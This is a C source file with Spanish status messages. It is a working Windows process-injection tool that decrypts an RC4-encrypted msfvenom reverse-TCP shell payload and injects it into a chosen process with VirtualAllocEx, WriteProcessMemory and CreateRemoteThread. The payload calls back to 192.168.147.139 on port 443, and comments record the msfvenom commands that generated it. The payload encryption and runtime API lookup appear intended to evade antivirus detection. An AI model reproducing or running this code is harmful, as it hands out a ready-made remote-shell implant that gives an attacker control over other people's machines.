#include <windows.h>
#include <stdio.h>

#define ARRAY_LENGTH	256

typedef HANDLE	(WINAPI *EOpenProcess)			(DWORD, BOOL, DWORD);
typedef LPVOID  (WINAPI *EVirtualAllocEx)       (HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *EWriteProcessMemory)   (HANDLE, LPVOID, LPCVOID,  SIZE_T, SIZE_T*);
typedef HANDLE  (WINAPI *ECreateRemoteThread)   (HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);


unsigned char s[ARRAY_LENGTH];
int rc4_i;
int rc4_j;

void swap(unsigned char *s1, unsigned char *s2)
{
	char temp = *s1;

	*s1 = *s2;
	*s2 = temp;
}


int InitRC4(void)
{
	int i;

	for(i=0 ; i< ARRAY_LENGTH; i++)
		s[i] = i;

	rc4_i = rc4_j = 0;

	return 1;
}

int DoKSA(unsigned char *key, int key_len)
{

	for(rc4_i = 0; rc4_i < ARRAY_LENGTH; rc4_i++)
	{
		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len])% ARRAY_LENGTH;
		swap(&s[rc4_i], &s[rc4_j]);
	}
	
	// Reset counters for Prga

	rc4_i = rc4_j = 0;

}


char GetPRGAOutput(void)
{
	rc4_i = (rc4_i +1 ) % ARRAY_LENGTH;

	rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;

	swap(&s[rc4_i], &s[rc4_j]);

	return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];
}


void printLastError() {
    char error[255];
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
               NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
               error, (sizeof(error) / sizeof(char)), NULL);
     printf(error);
}

int main(int argc, char *argv[]) {

    if (argc <= 1) {
		printf("\nUsar: %s [pid]", argv[0]);
		return 1;
	}

        //msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.147.139 LPORT=443 --encrypt rc4 --encrypt-key inc0d3 -f c
    //msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.147.139 LPORT=443 -f c
    
    unsigned char payload[] = 
                            "\x88\xa1\x26\x40\xb5\x38\xdd\xcc\xf0\x6f\x95\x33\x33\x24\x60"
                            "\x97\xfb\x45\x88\xe2\x99\xa1\xce\xdb\xd0\x39\x07\x97\x0d\xe9"
                            "\x6a\x1a\x81\x59\x13\x21\xf4\x12\x0c\xb0\xa5\x3f\xf8\xd7\xb0"
                            "\x04\x22\x56\xbb\xba\x7f\xad\x63\xdc\x13\xfc\x34\x48\x6d\x98"
                            "\xf6\xca\xc0\xc0\xe6\xab\xc1\x41\x61\x52\x96\xcf\x6a\x4e\x1b"
                            "\x5c\xee\xac\x47\x2e\x76\x5e\x65\xaa\x28\x1f\x54\xf8\xf7\xf3"
                            "\x3c\x69\xf3\xc1\xc8\xb5\xee\xa4\xa1\xf7\xff\x04\x24\x38\x9d"
                            "\x46\x7e\x27\x3f\xc8\x91\x0f\xdd\xb2\xba\x73\x06\xb2\x4b\x62"
                            "\x3b\xa9\xbe\xbe\xce\x47\x10\x7a\x82\x62\x08\x59\x20\xc2\x6a"
                            "\xa8\x14\x77\xd9\x7b\x1f\x45\x80\x48\x24\xed\x62\x6d\xe1\x8a"
                            "\x14\x8f\xc9\x7f\x38\x15\x51\x88\x0a\x79\x1c\x5b\x24\x1b\xd2"
                            "\xd3\x88\x6d\x7b\x12\x4d\xb9\xb1\x6a\x4d\xb2\x8c\xab\x59\x69"
                            "\xfe\x6a\x19\x62\xd3\x85\xb0\x98\xc9\x64\x73\x64\x7c\x5e\x2c"
                            "\x6c\xc5\x35\x5d\x73\x57\x09\xe5\xb9\x0b\x77\x38\x2f\xca\xdd"
                            "\xa0\xc6\x51\xea\x7a\x56\xda\xa2\xf1\x28\x8e\x02\x0b\x3e\x49"
                            "\x7a\x64\x7c\x45\xb1\x34\x08\xb9\xea\xde\xe8\xa9\xd3\x3a\xfb"
                            "\x9e\xad\x30\x2c\xae\x79\xe5\xc3\x96\xaf\x3a\x8c\xdf\xf6\x2b"
                            "\xfb\xac\x27\xa6\xf8\xdc\xf0\x55\x92\xb8\x6f\xcc\x0f\xde\x99"
                            "\xf6\x8f\x60\xf1\xab\x2c\x9d\x33\xbe\xc9\x1c\x45\xe9\xbb\xa0"
                            "\x5b\xd1\x90\x09\x5e\x06\x83\x74\x7d\x66\x68\x53\x1a\x52\xad"
                            "\x3c\x1a\x9d\x2f\x16\x75\x35\xf9\x04\xe9\xeb\x27\xe1\x2c\x2a"
                            "\xe2\x6e\x4b\x31\x32\x6a\xfc\xf2\x3f\x0c\xc6\x92\xb2\xd2\xb7"
                            "\x77\x5f\xef\x1e\x21\x7e\x9d\x95\xf9\xf7\xcb\x50\x98\x1c\xa1"
                            "\xc7\x67\x75\xd6\x86\x66\x43\x1e\x11\x57\x56\xb2\xeb\xad\x5f"
                            "\x45\xe0\x32\x0d\xdb\x1a\x49\xe4\xb6\x08\xbc\x73\x6f\x0b\x64"
                            "\x6c\xf1\xeb\xf9\x93\x58\x0b\xee\x97\xc9\xd0\xad\xc6\x42\x54"
                            "\xb3\x6a\x42\xa1\xb3\x75\x42\xde\xb5\xb7\x60\x0b\x09\x02\xfb"
                            "\x2f\x04\x86\x6f\xbe\x9d\x67\x87\xe7\x38\xfe\xa8\xb9\x48\x5e"
                            "\x21\x01\xa1\xc6\x55\x43\xe6\xcf\x96\x1c\x82\x78\x64\x0a\x17"
                            "\x72\x87\x0e\xa5\xb9\xe9\x90\xd7\x6f\x81\xe8\x2b\x4c\x73\xb7"
                            "\x3a\x6e\x6f\xd9\x44\x44\x22\x29\xd0\x63";


    HMODULE kernel = GetModuleHandle("kernel32.dll");

    if (kernel == NULL) {
        printf("\nError al obtener el modulo:");
        printLastError();
        return 1;
    }
    printf("\n[+] Modulo Kernel32 controlado correctamente en 0x%p", kernel);



    FARPROC loadLib = GetProcAddress(kernel, "LoadLibraryA");

    
    if (loadLib == NULL) {
        printf("\nError al obtener la direccion de loadlibrary:");
        printLastError();
        return 1;
    }
    printf("\n[+] LoadLibrary controlado correctamente en 0x%p", loadLib);


    EOpenProcess openProc = (EOpenProcess)GetProcAddress(kernel, "OpenProcess");

    if (openProc == NULL) {
        printf("\nError al obtener la direccion de OpenProcess:");
        printLastError();
        return 1;
    }
    printf("\n[+] OpenProcess controlado correctamente en 0x%p", openProc);

    HANDLE p = openProc(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, atoi(argv[1]));
    if (p == NULL) {
        printf("\nError al controlar el proceso:");
        printLastError();
        return 1;
    }
    printf("\n[+] Proceso controlado correctamente en 0x%p", p);


    EVirtualAllocEx eVirtualAlloc = (EVirtualAllocEx)GetProcAddress(kernel, "VirtualAllocEx");

    if (eVirtualAlloc == NULL) {
        printf("\nError al obtener la direccion de VirtualAllocEx:");
        printLastError();
        return 1;
    }
    printf("\n[+] VirtualAllocEx controlado correctamente en 0x%p", eVirtualAlloc);


    LPVOID vAlloc = eVirtualAlloc(p, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); 
    if (vAlloc == NULL) {
        printf("\nError al solicitar memoria en el proceso: ");
        printLastError();
        return 1;
    }
    printf("\n[+] Memoria creada en el espacio del proceso correctamente en 0x%p", vAlloc);

    unsigned char keystream_byte;

    InitRC4();
	
	DoKSA("inc0d3", 6);

    printf("\n[+] Tamano del payload %i ", sizeof(payload));

    for(size_t i = 0, len = sizeof(payload) - 1; i < len; i++) {
        keystream_byte = GetPRGAOutput();
        payload[i] = payload[i] ^ keystream_byte;
        //printf("\\x%02hhX", payload[i]);
    }
    
    
    EWriteProcessMemory eWrite = (EWriteProcessMemory)GetProcAddress(kernel, "WriteProcessMemory");

    if (eWrite == NULL) {
        printf("\nError al obtener la direccion de WriteProcessMemory:");
        printLastError();
        return 1;
    }
    printf("\n[+] WriteProcessMemory controlado correctamente en 0x%p", eWrite);


      
    BOOL result = eWrite(p, vAlloc, payload, sizeof(payload), NULL);

    if (result == FALSE) {
        printf("\nError al escribir la shellcode en la memoria del proceso: ");
        printLastError();
        return 1;
    }
    printf("\n[+] Shellcode copiada en la memoria del proceso correctamente");




       
    ECreateRemoteThread eCreate = (ECreateRemoteThread)GetProcAddress(kernel, "CreateRemoteThread");

    if (eCreate == NULL) {
        printf("\nError al obtener la direccion de CreateRemoteThread:");
        printLastError();
        return 1;
    }
    printf("\n[+] CreateRemoteThread controlado correctamente en 0x%p", eCreate);

    HANDLE remoteThread = eCreate(p, NULL, 0, (LPTHREAD_START_ROUTINE)vAlloc, NULL, 0, NULL);

    if (remoteThread == NULL) {
        printf("\nError al ejecutar la shellcode: ");
        printLastError();
        return 1;
    }
    printf("\n[+] Shellcode ejecutada correctamente en 0x%p", remoteThread);


    WaitForSingleObject(remoteThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(remoteThread, &exitCode);

    if (exitCode != 0) {
        printf("\nShellcode ejecutada correctamente.");
    }
    
    CloseHandle(remoteThread);
    CloseHandle(p);   

    printf("\n");
    return 0;
}